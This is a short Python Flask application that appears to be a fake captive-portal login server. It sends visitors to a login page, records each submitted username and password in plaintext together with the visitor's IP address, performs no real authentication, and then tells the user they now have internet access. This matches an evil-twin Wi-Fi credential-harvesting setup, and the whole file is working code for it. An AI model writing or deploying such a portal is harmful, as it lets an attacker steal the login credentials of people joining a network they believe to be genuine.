from flask import Flask, request, redirect, render_template, make_response
import subprocess



app = Flask(__name__)






@app.route('/')
def index():
    response = make_response(redirect('/login'))
    # Set headers to disable browser caching
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response


@app.route('/login', methods=['GET', 'POST'])
def login():    
    if request.method == 'POST':
        # Extract username and password from the form data
        username = request.form.get('username')
        password = request.form.get('password')
        # Assuming the user's device IP address can be obtained from request.remote_addr
        user_ip = request.remote_addr

        # Log the username and password or perform authentication
        print(f'{user_ip}: Username: {username}, Password: {password}')

        

        # Redirect to a success page 
        return redirect('/success')

    # If it's a GET request, just render the login page
    return render_template('login.html')


@app.route('/success')
def success():
    return 'Logged in successfully! You now have internet access.'




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
